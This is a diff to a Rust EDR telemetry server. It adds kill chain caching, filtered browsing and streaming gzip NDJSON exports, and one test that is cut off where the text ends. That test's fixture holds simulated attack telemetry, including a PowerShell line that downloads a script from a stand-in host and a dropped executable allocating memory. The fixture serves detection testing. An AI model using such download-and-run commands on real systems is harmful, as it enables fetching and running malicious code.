@@ -215,6 +215,51 @@ pub struct StoredSystemReport {
     pub payload: serde_json::Value,
 }
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct StoredKillchainEvent {
+    pub key: String,
+    pub count: u64,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub count_all: Option<u64>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub machines: Option<u64>,
+    pub date: String,
+    pub time: String,
+    pub first_seen: String,
+    pub last_seen: String,
+    pub machine_id: String,
+    pub exe: String,
+    pub event: String,
+    pub details: String,
+    #[serde(default)]
+    pub raw: serde_json::Value,
+}
+
+#[derive(Default, Clone)]
+struct KillchainCache {
+    shapes: u64,
+    events: u64,
+    machines: Vec<serde_json::Value>,
+    machines_dirty: bool,
+    refreshed_at: Option<Instant>,
+}
+
+fn format_killchain_machines(
+    rows: Vec<(String, u64, u64, Option<String>, Option<String>)>,
+) -> Vec<serde_json::Value> {
+    rows.into_iter()
+        .map(|(machine, shapes, events, first, last)| {
+            serde_json::json!({
+                "machine_id": machine,
+                "shapes": shapes,
+                "events": events,
+                "first_seen": first,
+                "last_seen": last,
+            })
+        })
+        .collect()
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct EdrStats {
     pub total_behaviors: u64,
@@ -247,6 +292,7 @@ struct EdrStoreInner {
 /// (`edr_db`), read back at start and asked for searches and filters.
 pub struct EdrTelemetryStore {
     inner: RwLock<EdrStoreInner>,
+    killchain_cache: RwLock<KillchainCache>,
     db: Option<crate::edr_db::EdrDb>,
 }
 
@@ -261,8 +307,13 @@ impl EdrTelemetryStore {
     pub fn new() -> Self {
         Self {
             inner: RwLock::new(EdrStoreInner::default()),
+            killchain_cache: RwLock::new(KillchainCache::default()),
             db: None,
         }
+    }
+
+    pub fn has_db(&self) -> bool {
+        self.db.is_some()
     }
 
     /// A store backed by the SQLite history at `path`: the newest records and the
@@ -314,8 +365,22 @@ impl EdrTelemetryStore {
         .flatten()
         .max()
         .unwrap_or(0);
+        let mut kc_cache = KillchainCache::default();
+        match db.killchain_totals() {
+            Ok((shapes, events)) => {
+                kc_cache.shapes = shapes;
+                kc_cache.events = events;
+            }
+            Err(e) => eprintln!("[EDR] could not count kill chain totals: {e}"),
+        }
+        match db.killchain_machines() {
+            Ok(rows) => kc_cache.machines = format_killchain_machines(rows),
+            Err(e) => eprintln!("[EDR] could not read kill chain machines: {e}"),
+        }
+        kc_cache.refreshed_at = Some(Instant::now());
         Self {
             inner: RwLock::new(inner),
+            killchain_cache: RwLock::new(kc_cache),
             db: Some(db),
         }
     }
@@ -713,35 +778,81 @@ impl EdrTelemetryStore {
             .collect()
     }
 
+    pub fn stream_export_edr_events_to(
+        &self,
+        event_type: Option<&str>,
+        machine_id: Option<&str>,
+        q: Option<&str>,
+        limit: Option<usize>,
+        w: &mut dyn std::io::Write,
+    ) -> Result<u64, String> {
+        let et_clean = event_type.map(str::trim).filter(|s| !s.is_empty());
+        let mach_clean = machine_id.map(str::trim).filter(|s| !s.is_empty());
+        let q_lower = q.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty());
+        let cap = limit.filter(|&n| n > 0);
+        if let Some(db) = self.db.as_ref() {
+            let mut write_err: Option<std::io::Error> = None;
+            let n = db
+                .stream_export_edr_events(et_clean, mach_clean, q_lower.as_deref(), cap, |line| {
+                    if let Err(e) = w.write_all(line) {
+                        write_err = Some(e);
+                        return Err(());
+                    }
+                    Ok(())
+                })
+                .map_err(|e| e.to_string())?;
+            if let Some(e) = write_err {
+                return Err(e.to_string());
+            }
+            return Ok(n);
+        }
+        let guard = self.inner.read().map_err(|_| "store lock poisoned".to_string())?;
+        let mut n = 0u64;
+        for ev in guard.events.iter().rev() {
+            if cap.is_some_and(|c| n as usize >= c) {
+                break;
+            }
+            if let Some(et) = et_clean {
+                let matched = et
+                    .split(',')
+                    .map(str::trim)
+                    .filter(|s| !s.is_empty())
+                    .any(|want| ev.event_type.eq_ignore_ascii_case(want));
+                if !matched {
+                    continue;
+                }
+            }
+            if mach_clean.is_some_and(|m| ev.machine_id != m) {
+                continue;
+            }
+            if let Some(ref search) = q_lower {
+                let matches = ev.event_type.to_lowercase().contains(search)
+                    || ev.process_name.to_lowercase().contains(search)
+                    || ev.exe_path.to_lowercase().contains(search)
+                    || ev.machine_id.to_lowercase().contains(search)
+                    || ev.pid.to_string().contains(search)
+                    || ev.details.as_deref().map_or(false, |d| d.to_lowercase().contains(search))
+                    || ev.raw.to_string().to_lowercase().contains(search);
+                if !matches {
+                    continue;
+                }
+            }
+            if let Ok(line) = serde_json::to_vec(ev) {
+                w.write_all(&line).map_err(|e| e.to_string())?;
+                w.write_all(b"\n").map_err(|e| e.to_string())?;
+                n += 1;
+            }
+        }
+        Ok(n)
+    }
+
     pub fn export_edr_events(
         &self,
         event_type: Option<&str>,
         machine_id: Option<&str>,
     ) -> Result<(Vec<u8>, u64), String> {
-        let et_clean = event_type.map(str::trim).filter(|s| !s.is_empty());
-        let mach_clean = machine_id.map(str::trim).filter(|s| !s.is_empty());
-        if let Some(db) = self.db.as_ref() {
-            let mut out = Vec::new();
-            let n = db
-                .export_edr_events(et_clean, mach_clean, &mut out)
-                .map_err(|e| e.to_string())?;
-            return Ok((out, n));
-        }
-        let guard = self.inner.read().map_err(|_| "store lock poisoned".to_string())?;
         let mut out = Vec::new();
-        let mut n = 0u64;
-        for ev in guard.events.iter().rev() {
-            if et_clean.is_some_and(|et| !ev.event_type.eq_ignore_ascii_case(et)) {
-                continue;
-            }
-            if mach_clean.is_some_and(|m| ev.machine_id != m) {
-                continue;
-            }
-            if serde_json::to_writer(&mut out, ev).is_ok() {
-                out.push(b'\n');
-                n += 1;
-            }
-        }
+        let n = self.stream_export_edr_events_to(event_type, machine_id, None, None, &mut out)?;
         Ok((out, n))
     }
 
@@ -1848,39 +1959,53 @@ pub async fn handle_get_edr_stats(
 pub async fn handle_get_edr_behaviors(
     State(app): State<Arc<AppState>>,
     Query(query): Query<TelemetryQuery>,
-) -> impl IntoResponse {
+) -> axum::response::Response {
     let limit = query.limit.unwrap_or(100).min(500);
-    let items = app.edr_telemetry.get_behaviors(limit, query.risk.as_deref(), query.q.as_deref());
-    Json(serde_json::json!({
-        "total": items.len(),
-        "behaviors": items
-    }))
+    let store = Arc::clone(&app.edr_telemetry);
+    match tokio::task::spawn_blocking(move || store.get_behaviors(limit, query.risk.as_deref(), query.q.as_deref()))
+        .await
+    {
+        Ok(items) => Json(serde_json::json!({
+            "total": items.len(),
+            "behaviors": items
+        }))
+        .into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
 }
 
 /// Handler for GET /api/v1/edr/telemetry/flows
 pub async fn handle_get_edr_flows(
     State(app): State<Arc<AppState>>,
     Query(query): Query<TelemetryQuery>,
-) -> impl IntoResponse {
+) -> axum::response::Response {
     let limit = query.limit.unwrap_or(200).min(1000);
-    let items = app.edr_telemetry.get_flows(limit, query.q.as_deref());
-    Json(serde_json::json!({
-        "total": items.len(),
-        "flows": items
-    }))
+    let store = Arc::clone(&app.edr_telemetry);
+    match tokio::task::spawn_blocking(move || store.get_flows(limit, query.q.as_deref())).await {
+        Ok(items) => Json(serde_json::json!({
+            "total": items.len(),
+            "flows": items
+        }))
+        .into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
 }
 
 /// Handler for GET /api/v1/edr/telemetry/threats
 pub async fn handle_get_edr_threats(
     State(app): State<Arc<AppState>>,
     Query(query): Query<TelemetryQuery>,
-) -> impl IntoResponse {
+) -> axum::response::Response {
     let limit = query.limit.unwrap_or(100).min(500);
-    let items = app.edr_telemetry.get_threats(limit);
-    Json(serde_json::json!({
-        "total": items.len(),
-        "threats": items
-    }))
+    let store = Arc::clone(&app.edr_telemetry);
+    match tokio::task::spawn_blocking(move || store.get_threats(limit)).await {
+        Ok(items) => Json(serde_json::json!({
+            "total": items.len(),
+            "threats": items
+        }))
+        .into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
 }
 
 // ------------------------------------------------------------------ kill chains
@@ -2028,12 +2153,23 @@ impl EdrTelemetryStore {
                     "raw": r.raw,
                     "machine_id": machine,
                 });
+                let search = crate::edr_db::killchain_search_text(
+                    &r.key,
+                    &machine,
+                    &r.exe,
+                    &r.event,
+                    &r.details,
+                    &r.raw,
+                );
                 crate::edr_db::KillchainRow {
                     key: r.key.clone(),
                     count: r.count.max(1),
                     data: line.to_string(),
                     date: r.date.chars().take(16).collect(),
                     time: r.time.chars().take(32).collect(),
+                    event_type: r.event.clone(),
+                    exe: r.exe.clone(),
+                    search,
                 }
             })
             .collect();
@@ -2043,58 +2179,272 @@ impl EdrTelemetryStore {
             .filter(|(k, _)| valid_killchain_key(k))
             .map(|(k, c)| (k.clone(), *c))
             .collect();
-        db.merge_killchain(&machine, &Utc::now().to_rfc3339(), &records, &counts)
-            .map_err(|e| e.to_string())
+        let (new, merged, added_events) = db
+            .merge_killchain(&machine, &Utc::now().to_rfc3339(), &records, &counts)
+            .map_err(|e| e.to_string())?;
+        if let Ok(mut kc) = self.killchain_cache.write() {
+            kc.shapes = kc.shapes.saturating_add(new);
+            kc.events = kc.events.saturating_add(added_events);
+            kc.machines_dirty = true;
+        }
+        Ok((new, merged))
     }
 
     /// (distinct event shapes, events they stand for); zeros without a database.
     pub fn killchain_totals(&self) -> (u64, u64) {
-        self.db.as_ref().and_then(|db| db.killchain_totals().ok()).unwrap_or((0, 0))
+        let Some(db) = self.db.as_ref() else {
+            return (0, 0);
+        };
+        let is_archive = crate::config::is_archive();
+        if let Ok(kc) = self.killchain_cache.read() {
+            let fresh = !is_archive
+                || kc.refreshed_at.is_some_and(|t| t.elapsed() < Duration::from_secs(30));
+            if fresh {
+                return (kc.shapes, kc.events);
+            }
+        }
+        match db.killchain_totals() {
+            Ok((shapes, events)) => {
+                if let Ok(mut kc) = self.killchain_cache.write() {
+                    kc.shapes = shapes;
+                    kc.events = events;
+                    kc.refreshed_at = Some(Instant::now());
+                }
+                (shapes, events)
+            }
+            Err(_) => self
+                .killchain_cache
+                .read()
+                .map(|kc| (kc.shapes, kc.events))
+                .unwrap_or((0, 0)),
+        }
+    }
+
+    /// Browses/filters kill chain event shapes for dashboard display and inspection.
+    pub fn get_killchain_records(
+        &self,
+        limit: usize,
+        machine: Option<&str>,
+        event_type: Option<&str>,
+        q: Option<&str>,
+    ) -> Result<Vec<StoredKillchainEvent>, String> {
+        let db = self.db.as_ref().ok_or("no EDR telemetry database")?;
+        let mach = machine.map(str::trim).filter(|s| !s.is_empty());
+        let et = event_type.map(str::trim).filter(|s| !s.is_empty());
+        let search = q.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty());
+        db.killchain_records(limit, mach, et, search.as_deref())
+            .map_err(|e| e.to_string())
+    }
+
+    /// Streams kill chain event lines into `w` over an independent read-only DB connection.
+    pub fn stream_export_killchain_to(
+        &self,
+        machine: Option<&str>,
+        event_type: Option<&str>,
+        q: Option<&str>,
+        limit: Option<usize>,
+        w: &mut dyn std::io::Write,
+    ) -> Result<u64, String> {
+        let db = self.db.as_ref().ok_or("no EDR telemetry database")?;
+        let mach = machine.map(str::trim).filter(|s| !s.is_empty());
+        let et = event_type.map(str::trim).filter(|s| !s.is_empty());
+        let search = q.map(|s| s.trim().to_lowercase()).filter(|s| !s.is_empty());
+        let cap = limit.filter(|&n| n > 0);
+        let mut write_err: Option<std::io::Error> = None;
+        let n = db
+            .stream_export_killchain(mach, et, search.as_deref(), cap, |line| {
+                if let Err(e) = w.write_all(line) {
+                    write_err = Some(e);
+                    return Err(());
+                }
+                Ok(())
+            })
+            .map_err(|e| e.to_string())?;
+        if let Some(e) = write_err {
+            return Err(e.to_string());
+        }
+        Ok(n)
     }
 
     /// Every stored kill chain event as JSON lines (see `EdrDb::export_killchain`),
     /// or one machine's own chain when `machine` is given
     /// (`EdrDb::export_killchain_machine`).
     pub fn export_killchain(&self, machine: Option<&str>) -> Result<(Vec<u8>, u64), String> {
-        let db = self.db.as_ref().ok_or("no EDR telemetry database")?;
         let mut out = Vec::new();
-        let n = match machine {
-            Some(m) => db.export_killchain_machine(m, &mut out),
-            None => db.export_killchain(&mut out),
-        }
-        .map_err(|e| e.to_string())?;
+        let n = self.stream_export_killchain_to(machine, None, None, None, &mut out)?;
         Ok((out, n))
     }
 
     /// Machines that uploaded kill chain events (see `EdrDb::killchain_machines`).
     pub fn killchain_machines(&self) -> Result<Vec<serde_json::Value>, String> {
         let db = self.db.as_ref().ok_or("no EDR telemetry database")?;
+        let is_archive = crate::config::is_archive();
+        if let Ok(kc) = self.killchain_cache.read() {
+            let fresh = !kc.machines_dirty
+                && (!is_archive || kc.refreshed_at.is_some_and(|t| t.elapsed() < Duration::from_secs(30)));
+            if fresh {
+                return Ok(kc.machines.clone());
+            }
+        }
         let rows = db.killchain_machines().map_err(|e| e.to_string())?;
-        Ok(rows
-            .into_iter()
-            .map(|(machine, shapes, events, first, last)| {
-                serde_json::json!({
-                    "machine_id": machine,
-                    "shapes": shapes,
-                    "events": events,
-                    "first_seen": first,
-                    "last_seen": last,
-                })
-            })
-            .collect())
+        let formatted = format_killchain_machines(rows);
+        if let Ok(mut kc) = self.killchain_cache.write() {
+            kc.machines = formatted.clone();
+            kc.machines_dirty = false;
+            kc.refreshed_at = Some(Instant::now());
+        }
+        Ok(formatted)
     }
+}
+
+struct ChunkWriter {
+    tx: tokio::sync::mpsc::Sender<Result<axum::body::Bytes, std::io::Error>>,
+    buf: Vec<u8>,
+}
+
+impl ChunkWriter {
+    const CHUNK_BYTES: usize = 128 * 1024;
+
+    fn new(tx: tokio::sync::mpsc::Sender<Result<axum::body::Bytes, std::io::Error>>) -> Self {
+        Self {
+            tx,
+            buf: Vec::with_capacity(Self::CHUNK_BYTES),
+        }
+    }
+
+    fn send_chunk(&mut self) -> std::io::Result<()> {
+        if self.buf.is_empty() {
+            return Ok(());
+        }
+        let chunk = axum::body::Bytes::from(std::mem::replace(
+            &mut self.buf,
+            Vec::with_capacity(Self::CHUNK_BYTES),
+        ));
+        self.tx
+            .blocking_send(Ok(chunk))
+            .map_err(|_| std::io::Error::new(std::io::ErrorKind::BrokenPipe, "client disconnected"))
+    }
+}
+
+impl std::io::Write for ChunkWriter {
+    fn write(&mut self, data: &[u8]) -> std::io::Result<usize> {
+        if self.buf.len() + data.len() > Self::CHUNK_BYTES && !self.buf.is_empty() {
+            self.send_chunk()?;
+        }
+        if data.len() >= Self::CHUNK_BYTES {
+            self.tx
+                .blocking_send(Ok(axum::body::Bytes::copy_from_slice(data)))
+                .map_err(|_| std::io::Error::new(std::io::ErrorKind::BrokenPipe, "client disconnected"))?;
+        } else {
+            self.buf.extend_from_slice(data);
+        }
+        Ok(data.len())
+    }
+
+    fn flush(&mut self) -> std::io::Result<()> {
+        self.send_chunk()
+    }
+}
+
+fn safe_export_suffix(s: &str) -> String {
+    s.chars()
+        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
+        .take(64)
+        .collect()
+}
+
+fn ndjson_stream_response(
+    file_stem: String,
+    gzip: bool,
+    producer: impl FnOnce(&mut dyn std::io::Write) -> Result<(), String> + Send + 'static,
+) -> axum::response::Response {
+    let (tx, rx) = tokio::sync::mpsc::channel::<Result<axum::body::Bytes, std::io::Error>>(16);
+    tokio::task::spawn_blocking(move || {
+        let err_tx = tx.clone();
+        let mut writer = ChunkWriter::new(tx);
+        let res = if gzip {
+            let mut gz = flate2::write::GzEncoder::new(writer, flate2::Compression::fast());
+            match producer(&mut gz) {
+                Ok(()) => match gz.finish() {
+                    Ok(mut inner) => std::io::Write::flush(&mut inner).map_err(|e| e.to_string()),
+                    Err(e) => Err(e.to_string()),
+                },
+                Err(e) => Err(e),
+            }
+        } else {
+            producer(&mut writer).and_then(|()| std::io::Write::flush(&mut writer).map_err(|e| e.to_string()))
+        };
+        if let Err(e) = res {
+            let _ = err_tx.blocking_send(Err(std::io::Error::new(std::io::ErrorKind::Other, e)));
+        }
+    });
+    let ext = if gzip { "jsonl.gz" } else { "jsonl" };
+    let ctype = if gzip { "application/gzip" } else { "application/x-ndjson" };
+    let disp = format!("attachment; filename=\"{file_stem}.{ext}\"");
+    let stream = futures_util::stream::unfold(rx, |mut rx| async move {
+        rx.recv().await.map(|item| (item, rx))
+    });
+    let body = axum::body::Body::from_stream(stream);
+    axum::response::Response::builder()
+        .status(axum::http::StatusCode::OK)
+        .header(axum::http::header::CONTENT_TYPE, ctype)
+        .header(axum::http::header::CONTENT_DISPOSITION, disp)
+        .header(axum::http::header::CACHE_CONTROL, "no-store")
+        .header(axum::http::header::X_CONTENT_TYPE_OPTIONS, "nosniff")
+        .body(body)
+        .unwrap_or_else(|e| (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response())
+}
+
+#[derive(Debug, Deserialize)]
+pub struct KillchainListQuery {
+    pub limit: Option<usize>,
+    pub machine: Option<String>,
+    pub event_type: Option<String>,
+    pub q: Option<String>,
 }
 
 #[derive(Debug, Deserialize)]
 pub struct KillchainExportQuery {
     /// One machine's kill chain (its `machine_id`); all machines merged when absent.
     pub machine: Option<String>,
+    pub event_type: Option<String>,
+    pub q: Option<String>,
+    pub limit: Option<usize>,
+    pub gzip: Option<bool>,
+}
+
+/// Handler for GET /api/v1/edr/telemetry/killchain
+pub async fn handle_get_killchain(
+    State(app): State<Arc<AppState>>,
+    Query(query): Query<KillchainListQuery>,
+) -> axum::response::Response {
+    let limit = query.limit.unwrap_or(200).min(5000);
+    let store = Arc::clone(&app.edr_telemetry);
+    let mach = query.machine;
+    let et = query.event_type;
+    let q = query.q;
+    match tokio::task::spawn_blocking(move || {
+        store.get_killchain_records(limit, mach.as_deref(), et.as_deref(), q.as_deref())
+    })
+    .await
+    {
+        Ok(Ok(items)) => Json(serde_json::json!({
+            "total": items.len(),
+            "records": items
+        }))
+        .into_response(),
+        Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
 }
 
 /// Handler for GET /api/v1/edr/telemetry/killchain/stats
-pub async fn handle_get_killchain_stats(State(app): State<Arc<AppState>>) -> impl IntoResponse {
-    let (shapes, events) = app.edr_telemetry.killchain_totals();
-    Json(serde_json::json!({ "shapes": shapes, "events": events }))
+pub async fn handle_get_killchain_stats(State(app): State<Arc<AppState>>) -> axum::response::Response {
+    let store = Arc::clone(&app.edr_telemetry);
+    match tokio::task::spawn_blocking(move || store.killchain_totals()).await {
+        Ok((shapes, events)) => Json(serde_json::json!({ "shapes": shapes, "events": events })).into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
 }
 
 /// Handler for GET /api/v1/edr/telemetry/killchain/machines: the machines that
@@ -2121,6 +2471,9 @@ pub struct EdrEventsQuery {
 pub struct EdrEventsExportQuery {
     pub event_type: Option<String>,
     pub machine_id: Option<String>,
+    pub q: Option<String>,
+    pub limit: Option<usize>,
+    pub gzip: Option<bool>,
 }
 
 /// Handler for POST /api/v1/edr/telemetry/events (dashboard route; supports Brotli & plain JSON).
@@ -2174,7 +2527,7 @@ pub async fn handle_get_edr_events(
     }
 }
 
-/// Handler for GET /api/v1/edr/telemetry/events/export (full lossless NDJSON download).
+/// Handler for GET /api/v1/edr/telemetry/events/export (streaming lossless NDJSON download).
 pub async fn handle_export_edr_events(
     State(app): State<Arc<AppState>>,
     Query(query): Query<EdrEventsExportQuery>,
@@ -2182,75 +2535,62 @@ pub async fn handle_export_edr_events(
     let store = Arc::clone(&app.edr_telemetry);
     let et = query.event_type.filter(|s| !s.trim().is_empty());
     let mach = query.machine_id.filter(|s| !s.trim().is_empty());
-    let file_name = match &mach {
-        Some(m) => {
-            let safe: String = m
-                .chars()
-                .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
-                .take(64)
-                .collect();
-            format!("attachment; filename=\"edr_events_{safe}.jsonl\"")
-        }
-        None => "attachment; filename=\"edr_events.jsonl\"".to_string(),
+    let q = query.q.filter(|s| !s.trim().is_empty());
+    let limit = query.limit.filter(|&n| n > 0);
+    let gzip = query.gzip.unwrap_or(false);
+    let file_stem = match &mach {
+        Some(m) => format!("edr_events_{}", safe_export_suffix(m)),
+        None => "edr_events".to_string(),
     };
-    let result = tokio::task::spawn_blocking(move || store.export_edr_events(et.as_deref(), mach.as_deref())).await;
-    match result {
-        Ok(Ok((body, _))) => (
-            [
-                (axum::http::header::CONTENT_TYPE, "application/x-ndjson".to_string()),
-                (axum::http::header::CONTENT_DISPOSITION, file_name),
-            ],
-            body,
-        )
-            .into_response(),
-        Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
-        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
-    }
+    ndjson_stream_response(file_stem, gzip, move |w| {
+        store
+            .stream_export_edr_events_to(et.as_deref(), mach.as_deref(), q.as_deref(), limit, w)
+            .map(|_| ())
+    })
 }
 
 /// Handler for GET /api/v1/edr/telemetry/system-reports
 pub async fn handle_get_system_reports(
     State(app): State<Arc<AppState>>,
     Query(query): Query<TelemetryQuery>,
-) -> impl IntoResponse {
+) -> axum::response::Response {
     let limit = query.limit.unwrap_or(50).min(500);
-    let items = app.edr_telemetry.get_system_reports(limit);
-    Json(serde_json::json!({
-        "total": items.len(),
-        "reports": items
-    }))
+    let store = Arc::clone(&app.edr_telemetry);
+    match tokio::task::spawn_blocking(move || store.get_system_reports(limit)).await {
+        Ok(items) => Json(serde_json::json!({
+            "total": items.len(),
+            "reports": items
+        }))
+        .into_response(),
+        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    }
 }
 
-/// Handler for GET /api/v1/edr/telemetry/killchain/export: the kill chain training
-/// set as JSON lines (`train_kc_hybrid.py <file>` reads it). `?machine=<id>`: that
-/// machine's own kill chain, in the order it happened there.
+/// Handler for GET /api/v1/edr/telemetry/killchain/export: streaming kill chain training
+/// set as JSON lines (`train_kc_hybrid.py <file>` reads it). Supports `?machine=<id>`,
+/// `?event_type=...`, `?q=...`, `?limit=...`, and `?gzip=true`.
 pub async fn handle_export_killchain(
     State(app): State<Arc<AppState>>,
     Query(query): Query<KillchainExportQuery>,
 ) -> axum::response::Response {
     let store = Arc::clone(&app.edr_telemetry);
-    let machine = query.machine.filter(|m| !m.is_empty());
-    // Only file-name-safe characters of the machine id go into the download name.
-    let file_name = match &machine {
-        Some(m) => {
-            let safe: String = m.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_').take(64).collect();
-            format!("attachment; filename=\"killchain_{safe}.jsonl\"")
-        }
-        None => "attachment; filename=\"killchain_events.jsonl\"".to_string(),
-    };
-    let result = tokio::task::spawn_blocking(move || store.export_killchain(machine.as_deref())).await;
-    match result {
-        Ok(Ok((body, _))) => (
-            [
-                (axum::http::header::CONTENT_TYPE, "application/x-ndjson".to_string()),
-                (axum::http::header::CONTENT_DISPOSITION, file_name),
-            ],
-            body,
-        )
-            .into_response(),
-        Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
-        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
+    if !store.has_db() {
+        return (axum::http::StatusCode::SERVICE_UNAVAILABLE, "no EDR telemetry database").into_response();
     }
+    let machine = query.machine.map(|m| m.trim().to_string()).filter(|m| !m.is_empty());
+    let et = query.event_type.filter(|s| !s.trim().is_empty());
+    let q = query.q.filter(|s| !s.trim().is_empty());
+    let limit = query.limit.filter(|&n| n > 0);
+    let gzip = query.gzip.unwrap_or(false);
+    let file_stem = match &machine {
+        Some(m) => format!("killchain_{}", safe_export_suffix(m)),
+        None => "killchain_events".to_string(),
+    };
+    ndjson_stream_response(file_stem, gzip, move |w| {
+        store
+            .stream_export_killchain_to(machine.as_deref(), et.as_deref(), q.as_deref(), limit, w)
+            .map(|_| ())
+    })
 }
 
 #[cfg(test)]
@@ -2922,5 +3262,181 @@ mod tests {
         for tamper_pid in [7106u32, 7107, 7108] {
             assert!(behaviors.iter().any(|b| b.pid == tamper_pid && b.detection == "Server.EDR.SecurityDriverUnloaded"));
         }
+    }
+
+    #[test]
+    fn killchain_browse_legacy_fallback_streaming_gzip_and_query_plans() {
+        use std::io::{Read, Write};
+        let path = tmp_db("kc_stream_and_plans");
+        let store = EdrTelemetryStore::open(&path);
+
+        let first = KillchainBatch {
+            machine_id: "host-a".into(),
+            records: vec![
+                KillchainRecord {
+                    key: "00000000000000a1".into(),
+                    date: "20261126".into(),
+                    time: "10:00:00.001".into(),
+                    exe: r"C:\Windows\System32\powershell.exe".into(),
+                    event: "SCRIPT_BLOCK_ACTIVITY".into(),
+                    details: "Invoke-WebRequest".into(),
+                    raw: serde_json::json!({"ScriptBlockText": "Invoke-WebRequest https://x.test/p.ps1", "pid": 4104}),
+                    count: 2,
+                },
+                KillchainRecord {
+                    key: "00000000000000b2".into(),
+                    date: "20261126".into(),
+                    time: "10:00:05.002".into(),
+                    exe: r"C:\Temp\drop.exe".into(),
+                    event: "SANCTUM_GHOST_HUNT".into(),
+                    details: "NtAllocateVirtualMemory".into(),
+                    raw: serde_json::json!({"syscall_name": "NtAllocateVirtualMemory", "hashes": {"sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}),
+                    count: 1,
+                },
+            ],
+            counts: [("00000000000000ff".to_string(), 99)].into(), // non-existent key must NOT raise totals
+        };
+        assert_eq!(store.ingest_killchain(&first).unwrap(), (2, 0));
+        assert_eq!(store.killchain_totals(), (2, 3));
+
+        // Reopen DB so cache must initialize from SQLite, and simulate a legacy row with empty event_type/search.
+        drop(store);
+        {
+            let db = crate::edr_db::EdrDb::open(&path).unwrap();
+            let ro = db.open_readonly().unwrap();
+            let explain = |sql: &str, args: &[&dyn rusqlite::ToSql]| -> String {
+                let q = format!("EXPLAIN QUERY PLAN {sql}");
+                let mut st = ro.prepare(&q).unwrap();
+                let mut out = String::new();
+                let rows = st
+                    .query_map(args, |r| r.get::<_, String>(3))
+                    .unwrap();
+                for row in rows {
+                    out.push_str(&row.unwrap());
+                    out.push('\n');
+                }
+                out
+            };
+
+            let p_all = explain(
+                "SELECT k.key, k.count, (SELECT COUNT(*) FROM killchain_machines m WHERE m.key = k.key), k.data FROM killchain_events k ORDER BY k.first_seen, k.key",
+                &[],
+            );
+            assert!(
+                !p_all.contains("USE TEMP B-TREE FOR ORDER BY"),
+                "export_killchain should use index without temp sort:\n{p_all}"
+            );
+
+            let p_mach = explain(
+                "SELECT k.key, m.count, k.count, m.event_date, m.event_time, k.data FROM killchain_machines m JOIN killchain_events k ON k.key = m.key WHERE m.machine = ?1 ORDER BY m.event_date, m.event_time, m.key",
+                &[&"host-a"],
+            );
+            assert!(
+                !p_mach.contains("USE TEMP B-TREE FOR ORDER BY"),
+                "export_killchain_machine should use index without temp sort:\n{p_mach}"
+            );
+
+            let p_browse = explain(
+                "SELECT k.key, k.count, (SELECT COUNT(*) FROM killchain_machines m WHERE m.key = k.key), k.first_seen, k.last_seen, k.data FROM killchain_events k ORDER BY k.last_seen DESC, k.key DESC LIMIT ?1",
+                &[&50i64],
+            );
+            assert!(
+                !p_browse.contains("USE TEMP B-TREE FOR ORDER BY"),
+                "killchain_records newest-first should use index without temp sort:\n{p_browse}"
+            );
+
+            let p_sysops = explain(
+                "SELECT COUNT(*) FROM edr_events WHERE event_type GLOB 'AGENT_*'",
+                &[],
+            );
+            assert!(
+                p_sysops.contains("edr_events_type_id"),
+                "AGENT_* stats count should use edr_events_type_id index:\n{p_sysops}"
+            );
+        }
+
+        // Wipe metadata on one row to verify legacy backward-compat filter fallback.
+        {
+            let conn = rusqlite::Connection::open(&path).unwrap();
+            conn.execute(
+                "UPDATE killchain_events SET event_type = '', exe = '', search = '' WHERE key = '00000000000000a1'",
+                [],
+            )
+            .unwrap();
+        }
+
+        let store = EdrTelemetryStore::open(&path);
+        assert_eq!(store.killchain_totals(), (2, 3));
+        assert_eq!(store.killchain_machines().unwrap().len(), 1);
+
+        // Browse + filter on legacy row (SCRIPT_BLOCK_ACTIVITY & invoke-webrequest) and new row (SANCTUM_GHOST_HUNT).
+        let ps = store
+            .get_killchain_records(50, None, Some("SCRIPT_BLOCK_ACTIVITY"), Some("invoke-webrequest"))
+            .unwrap();
+        assert_eq!(ps.len(), 1);
+        assert_eq!(ps[0].key, "00000000000000a1");
+
+        let sanctum = store
+            .get_killchain_records(50, Some("host-a"), Some("SCRIPT_BLOCK_ACTIVITY,SANCTUM_GHOST_HUNT"), Some("aaaaaaaaaaaaaaaa"))
+            .unwrap();
+        assert_eq!(sanctum.len(), 1);
+        assert_eq!(sanctum[0].key, "00000000000000b2");
+        assert_eq!(sanctum[0].count_all, Some(1));
+
+        // Streaming filtered export + gzip roundtrip.
+        let mut gz_bytes = Vec::new();
+        {
+            let mut enc = flate2::write::GzEncoder::new(&mut gz_bytes, flate2::Compression::fast());
+            let exported = store
+                .stream_export_killchain_to(Some("host-a"), Some("SCRIPT_BLOCK_ACTIVITY"), None, Some(1), &mut enc)
+                .unwrap();
+            assert_eq!(exported, 1);
+            enc.flush().unwrap();
+        }
+        let mut dec = flate2::read::GzDecoder::new(&gz_bytes[..]);
+        let mut gunzipped = String::new();
